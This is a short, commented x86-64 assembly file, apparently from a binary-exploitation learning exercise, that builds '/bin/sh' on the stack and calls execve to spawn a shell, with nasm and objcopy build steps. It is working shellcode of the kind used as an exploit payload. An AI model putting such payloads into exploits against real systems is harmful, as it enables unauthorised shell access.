[BITS 64]

; Compile with: 
;   nasm -felf64 shellcode.asm
;   objcopy -S -O binary -j .text shellcode.o shellcode

; To test shellcode:
;   ~/Documents/binaryExploitation/testShellCode/test_shellcode shellcode

section .text
global main

main:
; we will craft the string "/bin/sh" on the stack
; then we will execute an execve syscall

; "/bin/sh" in hex and with endianess swapped with a word length of 8 is 0068732f6e69622f
mov rax, 0x0068732f6e69622f
push rax

; rax takes 0x3b
; rdi takes pointer to "/bin/sh"
; rsi and rdx get 0'd out

mov rax, 0x3b
mov rdi, rsp ; move pointer to top of stack ( location of /bin/sh string ) into rdi
mov rdx, 0
mov rsi, 0
syscall
